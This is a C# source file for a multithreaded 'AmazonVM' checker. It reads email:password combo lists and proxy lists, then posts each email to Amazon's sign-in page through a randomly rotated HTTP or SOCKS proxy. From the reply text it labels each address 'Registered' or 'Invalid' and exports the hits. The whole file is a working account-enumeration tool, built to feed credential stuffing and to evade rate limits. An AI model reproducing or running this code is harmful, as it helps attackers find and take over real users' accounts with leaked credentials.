using JawBrute;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;
using yoboi_legend;

namespace Ebay_Checker
{
    class amazon
    {
        [STAThread]
        public static void GMX()
        {
            Prsc.gmxapi();
            Export.Initialize();
            Console.Title = "Mailos | AmazonVM";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("          > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            start();
        }
        public static void start()
        {
            Console.Clear();
            ASCII.ASCIII();
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - AmazonVM] | Registered: " + Variables.hit + " | Invalid: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckAccount)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckAccount()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`
                                IDictionary<string, string> map0 = new Dictionary<string, string>()
{
{"false","True"},
{"true","False"}
};
                                var regex = new Regex(String.Join("|", map0.Keys.Select(k => Regex.Escape(k))));

                                httpRequest.AddHeader("cookie", "skin=noskin; session-id=140-6605874-9084130; session-id-time=2082787201l; ubid-main=130-2269163-6174416;");

                                var res0 = httpRequest.Post("https://www.amazon.com/ap/signin", "appActionToken=Wj2FbTjxRyCm8iJHKhcdAyKci1jQYj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%1HLRm4T4ArKmaYtZJChEVtSNtY2MRuHxPd%2FcmVmXz1uYXZfY3VzdHJlY19zaWduaW4%3D&prevRID=ape%1HLRm4T4ArKmaYtZJChEVtSNtY2MRuHxPd%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.ed67mlCj_dg-L93dlkTvutSUmRbO8ScOffQpsl-rNS1cKK8AKkMtcA.1w8qoLdRvPhUkj4-.3IHC7BywnYhAREaU8jfSKCCOP1jN13LOlB4EM2H7cZU3yRCX3Uu8yQ9HMi-OttA61wywsd-E4kWcRV_hdQlAxIS1GbnSG1I2f2BvU-7lY4L9NND2XYqMakiarDAhf8WZxDp0pFuGCrDBKjsplw_s28I8FF5xqOVztuGAbJmnkS9dp34zivVbPS4SdrFdAqhc45nuXJq51ES3MoDelKgaTZI6uUUvma3wta_jJsYGzhz2qLmZTejXx2cJm1H1TLa6YjWBMso7L7P2BWwjBPorUawkjtGdAzt_3yf4xIObRlgdjZddClrpJDIJ_Qg1KqZF6YEGiq_Ndn_bNcy0hreXSEI-4A9fHZSjF3dAwfhc-a_vb3fc.90ckTBHjVmO6o-3sns9-sw&email=" + s[0] + "&password=123&create=0", "application/x-www-form-urlencoded");
                                string text0 = res0.ToString();

                                if (text0.Contains("To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below."))
                                {
                                    Variables.hit++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    Colorful.Console.WriteLine("               [Registered] " + s[0] + ":" + s[1], Color.Green);
                                    Export.AsResult("/hit", s[0] + ":" + s[1]);
                                }
                                else if (text0.Contains("We cannot find an account with that email address"))
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    break;
                                }
                                else
                                {
                                    break;//add retry here
                                }





                                {
                                    goto stat;
                                }
                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;
                    }
                }
            }
        }
    }
}